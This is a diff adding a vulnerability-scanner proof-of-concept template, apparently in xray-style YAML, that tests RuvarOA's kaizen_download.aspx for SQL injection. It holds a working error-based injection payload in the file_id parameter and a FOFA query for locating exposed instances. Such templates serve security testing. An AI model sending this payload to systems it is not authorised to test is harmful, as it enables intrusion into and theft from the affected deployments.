@@ -1,0 +1,17 @@
+id: poc-yaml-ruvaroa-kaizen-download-aspx-sqli
+info:
+  name: RuvarOA kaizen_download.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: ruvar-oa
+  fofa: body="txt_admin_key"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /CorporateCulture/kaizen_download.aspx?file_id=1%27%29%20and%20%28select%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{.t1}}%27))%29%3E0--
+  expression: "status_code == 500 && \ncontains(body,\"在将 nvarchar 值\") &&\ncontains(body,\"\
+    转换成数据类型 int 时失败\") &&\ncontains(body,t2)\n"
+transport: http
